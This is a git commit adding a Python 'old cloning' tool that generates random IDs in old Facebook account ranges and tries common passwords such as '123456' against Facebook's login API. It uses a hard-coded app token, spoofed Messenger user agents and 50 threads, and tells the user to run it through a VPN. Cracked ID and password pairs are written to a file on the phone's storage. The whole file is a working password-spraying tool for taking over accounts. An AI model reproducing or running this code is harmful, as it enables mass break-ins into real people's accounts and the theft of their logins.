f4c0e98360bfa9fc1114b1708bb4ef5401283a1b
MR-AK4SH-V4U <121036401+MR-AK4SH-V4U@users.noreply.github.com>
2025-11-06 11:23:56 +0600

    Add files via upload

---
+++ OLD-CLONE.py
@@ -0,0 +1,256 @@
+#===== SC SEND BY ; KALYAN KING
+
+#==== TELIGERM : KGF CYBER TEAM 
+
+import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform,httpx,mechanize,rich,json,subprocess
+try:
+	from time import sleep
+	from bs4 import BeautifulSoup as sop
+	from datetime import datetime
+	from random import randint as rr
+	from random import choice as rc
+	from string import digits as digits
+	from os import system as cmd
+	from concurrent.futures import ThreadPoolExecutor as AKASHXD 
+except ModuleNotFoundError:
+	os.system('pip install rich')
+	os.system('pip install requests')
+	os.system('pip install bs4')
+sys.stdout.write('\x1b]2; WELCOME TO MY OLD CLONING TOOLS\x07')
+os.system('espeak -v bn+f3 -a 120 -p 40 -s 100 "WELCOME TO AKASH OLD CLONING TOOLS"')
+
+def ___uax___():
+    fb_version = f'{random.randint(400, 699)}.0.0.{random.randint(10, 99)}.{random.randint(50, 120)}'
+    fb_build = str(random.randint(100000000, 999999999))
+    android_version = random.choice(['7', '7.1', '8', '8.1', '9', '10', '11', '12', '13', '14'])
+    samsung_models = ['SM-A075F', 'SM-A176B', 'SM-M566B', 'SM-A065F', 'SM-M356B', 'SM-E556B', 'SM-M156B', 'SM-A055F', 'SM-A155F', 'SM-E546B', 'SM-M146B', 'SM-M135F', 'SM-E236B', 'SM-A035F', 'SM-A037F', 'SM-F926B', 'SM-A226B', 'SM-A525F', 'SM-M025F/DS', 'SM-N981B', 'SM-A217F', 'SM-A115F', 'SM-A908B', 'SM-G977U', 'SM-N950F', 'SM-J730F', 'SM-G960F', 'SM-A730F', 'SM-G8870', 'GT-I8552B', 'GT-N7000']
+    model = random.choice(samsung_models)
+    width = random.choice([720, 1080])
+    height = random.choice([1600, 1920, 2400])
+    density = round(random.uniform(2.0, 3.5), 1)
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/{fb_version};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{fb_build};FBCR/Jio;FBMF/Samsung;FBBD/Samsung;FBDV/{model};FBSV/{android_version};FBCA/armeabi-v7a:armeabi;FBDM{{density={density},width={width},height={height}}};FB_FW/1;]'
+    return ua
+os.system('xdg-open https://t.me/AKASH_Xyz')
+
+##-------------(Basic colors)-------------------
+yellow = "\033[1;33m"
+black = "\033[1;90m"
+red = "\033[1;91m"
+green = "\033[1;32m"
+blue = "\033[1;34m"
+purple = "\033[1;35m"
+cyan = "\033[1;36m"
+r_cyan = "\033[38;5;122m"
+r_purple = "\033[38;5;147m"
+r_green = "\033[38;5;112m"
+white = "\033[0;97m"
+reset = '\x1b[0m'
+pink = "\x1b[38;5;205m"
+brown = "\x1b[38;5;208m"
+colors = [
+    "\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m",
+    "\033[0;92m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m",
+    "\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m",
+    "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m",
+    "\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m",
+    "\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m",
+    "\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m", "\033[0;104m", "\033[1;104m",
+    "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"
+]
+#---------------------------| Loop |---------------------------#
+id,id2,loop,ok,cp=[],[],0,0,0;user=[];total_hits = 0
+#---------------------------| Linex |---------------------------#
+def clear():os.system('clear');print(logo)
+def linex():print(f'{black}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯{white}')
+#---------------------------| Logo |---------------------------#
+logo=(f'''
+\033[1;36m███╗   ███╗██████╗      █████╗ ██╗  ██╗ █████╗ ███████╗██╗  ██╗
+\033[1;36m████╗ ████║██╔══██╗    ██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██║  ██║
+\033[1;36m██╔████╔██║██████╔╝    ███████║█████╔╝ ███████║███████╗███████║
+\033[1;36m██║╚██╔╝██║██╔══██╗    ██╔══██║██╔═██╗ ██╔══██║╚════██║██╔══██║
+\033[1;36m██║ ╚═╝ ██║██║  ██║    ██║  ██║██║  ██╗██║  ██║███████║██║  ██║
+\033[1;36m╚═╝     ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                                               
+
+\033[1;91m\033[1;41m\033[1;97m              WELCOME TO AKASH TOOLS               \033[;0m\033[1;91m\033[1;92m
+
+\033[1;92m══════════════════════════════════════════
+\033[1;32m[-] TOOLS TYPE:\033[1;32m OLD CLONE 
+\033[1;32m[-] AUTHOR    :\033[1;32m AKASH AHMED
+\033[1;32m[-] GITHUB    :\033[1;32m MR-AK4SH-V4U
+\033[1;32m[-] FACEBOOK  :\033[1;32m AKASH MAHMUD 
+\033[1;92m══════════════════════════════════════════
+
+\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS AKASH BRAND\033[;0m\033[1;91m═══>\033[1;92m''')
+
+
+# -------------(CHECK ID CREATION YEAR)--------------
+def creationyear(uid):
+    if len(uid) == 15:
+        if uid[:10] in ['1000000000']:
+            AKASH_dgk = '2009'
+        elif uid[:9] in ['100000000']:
+            AKASH_dgk = '2009'
+        elif uid[:8] in ['10000000']:
+            AKASH_dgk = '2009'
+        elif uid[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
+            AKASH_dgk = '2009'
+        elif uid[:7] in ['1000006', '1000007', '1000008', '1000009']:
+            AKASH_dgk = '2010'
+        elif uid[:6] in ['100001']:
+            AKASH_dgk = '2010'
+        elif uid[:6] in ['100002', '100003']:
+            AKASH_dgk = '2011'
+        elif uid[:6] in ['100004']:
+            AKASH_dgk = '2012'
+        elif uid[:6] in ['100005', '100006']:
+            AKASH_dgk = '2013'
+        elif uid[:6] in ['100007', '100008']:
+            AKASH_dgk = '2014'
+        elif uid[:6] in ['100009']:
+            AKASH_dgk = '2015'
+        elif uid[:5] in ['10001']:
+            AKASH_dgk = '2016'
+        elif uid[:5] in ['10002']:
+            AKASH_dgk = '2017'
+        elif uid[:5] in ['10003']:
+            AKASH_dgk = '2018'
+        elif uid[:5] in ['10004']:
+            AKASH_dgk = '2019'
+        elif uid[:5] in ['10005']:
+            AKASH_dgk = '2020'
+        elif uid[:5] in ['10006']:
+            AKASH_dgk = '2021'
+        elif uid[:5] in ['10009']:
+            AKASH_dgk = '2023'
+        elif uid[:5] in ['10007', '10008']:
+            AKASH_dgk = '2022'
+        else:
+            AKASH_dgk = ''
+    elif len(uid) in [9, 10]:
+        AKASH_dgk = '2008'
+    elif len(uid) == 8:
+        AKASH_dgk = '2007'
+    elif len(uid) == 7:
+        AKASH_dgk = '2006'
+    elif len(uid) == 14 and uid[:2] in ['61']:
+        AKASH_dgk = '2024'
+    else:
+        AKASH_dgk = ''
+    return AKASH_dgk
+        	
+#---------------------------[ MAIN MENU ]---------------------------#
+def WEHSHI________():
+    clear()
+    print(f"\033[1;90m[\033[1;97m1\033[1;90m]\033[0;97m OLD 2010 to 2012 CLONING")
+    print(f"\033[1;90m[\033[1;97m2\033[1;90m]\033[0;97m OLD 2009 & 2010 CLONING")
+    print(f"\033[1;90m[\033[1;97m3\033[1;90m]\033[0;97m OLD 2011 to 2014 CLONING")
+    print(f"\x1b[1;90m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\033[0;97m") 
+    option = input(f"\033[1;90m[\033[1;97m?\033[1;90m]\033[0;97m Enter Your Choice: ")
+    if option == "1":os.system('xdg-open https://www.facebook.com/AKASH.MAHMUD.102114');__2010___2011()
+    elif option == "2":os.system('xdg-open https://www.facebook.com/AKASH.MAHMUD.102114');____old2009___()
+    elif option == "3":os.system('xdg-open https://www.facebook.com/AKASH.MAHMUD.102114');_____old2011_____()
+    else:
+        print(f"{red}[!] Invalid choice..."); WEHSHI________()
+
+
+#---------------------------[ 2010-2011 CLONING ]---------------------------#
+
+def __2010___2011():
+    user = []
+    clear()
+    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
+    linex()
+    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
+    for i in range(int(limit)):
+        data = random.choice(["100001","100002","100003","100004"])+str(random.choice(range(111111111, 999999999)))
+        user.append(data)
+    with AKASHXD(max_workers=50) as AKASH:
+        tl = str(limit)
+        clear()
+        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
+        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
+        linex()
+        for mal in user:
+            uid = mal
+            pas = ['123456', '1234567', '12345678', '123456789', '123123', '1234567890', '111111']
+            AKASH.submit(____old____, uid, pas, tl)
+    print('');linex();print(f"\n{green} Cloning Session Complete")
+    print(f"{white}➤ Total OK: {green}{len(ok)}")
+    print(f"{white}➤ Total CP: {red}{len(cp)}")
+    linex()
+    exit()
+    
+#---------------------------[ 2009-2010 CLONING ]---------------------------#
+def ____old2009___():
+    clear()
+    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
+    linex()
+    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
+    for _ in range(int(limit)):
+        nmp = ''.join(random.choice(digits) for _ in range(9))
+        user.append(nmp)
+
+    with AKASHXD(max_workers=50) as AKASH:
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
+        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
+        linex()
+        for love in user:
+            uid = "100000" + love
+            pas = ['123456', '1234567', '12345678', '123456789']
+            AKASH.submit(____old____, uid, pas, tl)
+
+    print('');linex();print(f"\n{green} Cloning Session Complete")
+    print(f"{white}➤ Total OK: {green}{len(ok)}")
+    print(f"{white}➤ Total CP: {red}{len(cp)}")
+    linex()
+    exit()
+
+#---------------------------[ 2011-2014 CLONING ]---------------------------#
+def _____old2011_____():
+    clear()
+    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
+    linex()
+    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
+    for _ in range(int(limit)):
+        nmp = ''.join(random.choice(digits) for _ in range(10))
+        user.append(nmp)
+    with AKASHXD(max_workers=50) as AKASH:
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
+        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
+        linex()
+        for love in user:
+            uid = "10000" + love
+            pas = ['123456', '1234567', '12345678', '123456789']
+            AKASH.submit(____old____, uid, pas, tl)
+
+    print('');linex();print(f"\n{green} Cloning Session Complete")
+    print(f"{white}➤ Total OK: {green}{len(ok)}")
+    print(f"{white}➤ Total CP: {red}{len(cp)}")
+    linex()
+    exit()
+def ____old____(uid,pas,tl):
+    global loop,ok,total_hits
+    sys.stdout.write(f"\r\033[0m[\033[1;92mAKASH-XD\033[0m] \033[0;93m{loop}\033[0m/\033[1;91m{tl} \033[1;97m[\033[1;92mOK-{ok}\033[1;97m]");sys.stdout.flush()
+    try:
+        for ps in pas:
+            with requests.Session() as session:
+                headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': ___uax___(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+            po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
+            if "Please Confirm Email" in str(po):
+                print(f"\r\033[1;92m[AKASH-OK💚] {uid} ● {ps}\033[1;97m ● \033[1;92m{creationyear(uid)}")
+                open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"|"+creationyear(uid)+"\n");ok+=1
+                break
+            elif "session_key" in po:
+                print(f"\r\033[1;92m[AKASH-OK💚] {uid} ● {ps}\033[1;97m ● \033[1;92m{creationyear(uid)}")
+                open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"|"+creationyear(uid)+"\n");ok+=1
+                break
+            else:pass
+        loop+=1
+    except Exception as e:pass
+
+WEHSHI________()
